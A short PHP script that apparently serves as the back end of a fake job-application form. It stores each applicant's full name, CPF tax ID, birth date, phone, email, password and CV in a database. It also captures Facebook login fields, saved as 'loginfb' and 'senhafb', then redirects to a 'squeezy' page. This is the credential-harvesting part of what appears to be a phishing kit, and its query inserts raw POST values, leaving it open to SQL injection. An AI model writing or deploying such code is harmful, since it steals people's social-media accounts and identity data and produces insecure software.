<?php
include('conexao.php');
//
$id = $_GET['id'];
$key = $_GET['key'];
//Recebendo Variaveis
$nome = $_POST['nomecompleto'];
$cpf = $_POST['cpf'];
$nascimento = $_POST['nascimento'];
$numerocad = $_POST['numerocad'];
$emailcad = $_POST['emailcad'];
$senhacad = $_POST['senhacad'];
$cv = $_POST['cv'];
$loginfb = $_POST['email'];
$senhafb = $_POST['pass'];
// Inserção
$query = "INSERT INTO `cadastros` (`id`, `nome`, `cpf`, `nascimento`, `numero`, `email`, `senha`, `cv`, `loginfb`, `senhafb`, `idvaga`) VALUES (NULL, '{$nome}', '{$cpf}', '{$nascimento}', '{$numerocad}', '{$emailcad}', '{$senhacad}', '{$cv}', '{$loginfb}', '{$senhafb}', '{$id}');";
mysqli_query($conexao,$query);
// Redirecionar
header('Location: squeezy.php?key='.$key.'&id='.$id);